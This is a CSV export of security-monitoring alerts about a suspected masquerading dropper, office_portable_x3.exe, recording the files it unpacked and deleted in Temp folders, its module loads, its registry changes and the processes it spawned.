"Jun 1, 2026 @ 14:23:04.982",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\psutil\_psutil_windows.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F4930AAD
"Jun 1, 2026 @ 14:23:04.990",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\pyarmor_runtime_000000\pyarmor_runtime.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-753EFB75
"Jun 1, 2026 @ 14:23:04.992",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\python3.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-792E6267
"Jun 1, 2026 @ 14:23:04.979",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\libcrypto-3.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9370E0F6
"Jun 1, 2026 @ 14:23:04.934",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\uusd.exe,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8083FF1B
"Jun 1, 2026 @ 14:23:04.862",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-894F0127
"Jun 1, 2026 @ 14:23:04.858",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_wmi.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BE497586
"Jun 1, 2026 @ 14:23:05.659",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5B0AD7E5
"Jun 1, 2026 @ 14:23:05.692",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-508CBE48
"Jun 1, 2026 @ 14:23:05.727",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DF98FB51
"Jun 1, 2026 @ 14:22:58.527",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\base_library.zip,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-1901A7C3
"Jun 1, 2026 @ 14:22:58.502",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2C36A514
"Jun 1, 2026 @ 14:22:58.494",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_decimal.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-197AB1AA
"Jun 1, 2026 @ 14:22:58.496",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6255940D
"Jun 1, 2026 @ 14:22:58.499",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_lzma.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-93D2236C
"Jun 1, 2026 @ 14:22:58.505",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_wmi.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F3624544
"Jun 1, 2026 @ 14:22:58.503",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_uuid.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-97636474
"Jun 1, 2026 @ 14:23:04.836",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\base_library.zip,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7CBB2BAD
"Jun 1, 2026 @ 14:23:27.239",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\campus.py,,deletion,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-626C1FAB
"Jun 1, 2026 @ 14:23:05.520",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6D5755D6
"Jun 1, 2026 @ 14:23:05.547",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BA96CB55
"Jun 1, 2026 @ 14:23:05.603",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-42F0C708
"Jun 1, 2026 @ 14:23:05.632",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-8DD45453
"Jun 1, 2026 @ 14:23:05.323",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2488E5A2
"Jun 1, 2026 @ 14:23:05.398",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-FD13C882
"Jun 1, 2026 @ 14:23:05.430",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-33C6281D
"Jun 1, 2026 @ 14:23:05.455",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"30,312",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-42637676
"Jun 1, 2026 @ 14:23:04.849",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python3.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A10EB4ED
"Jun 1, 2026 @ 14:23:04.848",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\pyarmor_runtime_000000\pyarmor_runtime.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C9FA6D83
"Jun 1, 2026 @ 14:23:04.850",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\python313.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-966AE6E1
"Jun 1, 2026 @ 14:23:04.837",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\campus.py,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-62A3FFBE
"Jun 1, 2026 @ 14:23:04.839",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002w.txt,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-566E0CF2
"Jun 1, 2026 @ 14:23:04.844",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libcrypto-3.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-468E056F
"Jun 1, 2026 @ 14:23:04.846",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libffi-8.dll,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3F8DE490
"Jun 1, 2026 @ 14:23:04.847",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\psutil\_psutil_windows.pyd,,deletion,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-61DE0D3F
"Jun 1, 2026 @ 14:23:04.824",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\pack.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-67B81684
"Jun 1, 2026 @ 14:23:04.766",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_lzma.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3680EE0C
"Jun 1, 2026 @ 14:23:04.770",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_uuid.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-38236DC0
"Jun 1, 2026 @ 14:23:04.768",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_socket.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9848B06E
"Jun 1, 2026 @ 14:23:04.788",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\base_library.zip,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5A9240B8
"Jun 1, 2026 @ 14:23:04.795",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\campus.py,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-3C766FA7
"Jun 1, 2026 @ 14:23:04.796",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002.xml,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-31816856
"Jun 1, 2026 @ 14:23:04.772",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_wmi.pyd,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-08541F53
"Jun 1, 2026 @ 14:22:58.545",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_n.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-57F4B3AD
"Jun 1, 2026 @ 14:22:58.569",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002a.txt,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-57D61B12
"Jun 1, 2026 @ 14:22:58.572",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002w.txt,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-275546C1
"Jun 1, 2026 @ 14:22:58.573",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-9D92EBE1
"Jun 1, 2026 @ 14:22:58.683",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\uusd.exe,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-5E6559C1
"Jun 1, 2026 @ 14:22:58.735",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libcrypto-3.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C8FC3CAE
"Jun 1, 2026 @ 14:22:58.737",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\libffi-8.dll,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A74046EE
"Jun 1, 2026 @ 14:23:04.799",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_b.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-7407191D
"Jun 1, 2026 @ 14:23:04.800",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_d.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-13C292B0
"Jun 1, 2026 @ 14:23:04.802",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_n.js,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-AF108442
"Jun 1, 2026 @ 14:23:04.821",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002a.txt,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-CAD636D9
"Jun 1, 2026 @ 14:23:04.823",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002w.txt,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-97B12762
"Jun 1, 2026 @ 14:22:58.536",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\campus.py,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-6D75E487
"Jun 1, 2026 @ 14:22:58.538",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-E300F910
"Jun 1, 2026 @ 14:22:58.541",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-0F6E8B14
"Jun 1, 2026 @ 14:22:58.543",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_d.js,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D2C665AA
"Jun 1, 2026 @ 14:23:04.627",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,start,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-BD2E9A17
"Jun 1, 2026 @ 14:23:04.556",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,end,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A6B3A526
"Jun 1, 2026 @ 14:23:01.256",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-F7ED124F
"Jun 1, 2026 @ 14:23:01.255",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-32FCE8EA
"Jun 1, 2026 @ 14:22:59.785",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-DCFE0F59
"Jun 1, 2026 @ 14:22:59.753",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-A12435C7
"Jun 1, 2026 @ 14:22:59.575",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-2516C28A
"Jun 1, 2026 @ 14:22:59.535",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,load,"22,348",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-C8AAB233
"Jun 1, 2026 @ 14:22:58.739",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\psutil\_psutil_windows.pyd,,creation,"9,916",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-ECA3BD31
"Jun 1, 2026 @ 14:23:04.749",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,65,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140.dll,,creation,"12,756",T1036,Masquerading,False,HIGH,MEDIUM,Suspicious,Investigate,Collect file artefacts; hash and submit to VT,AH-D48E199B
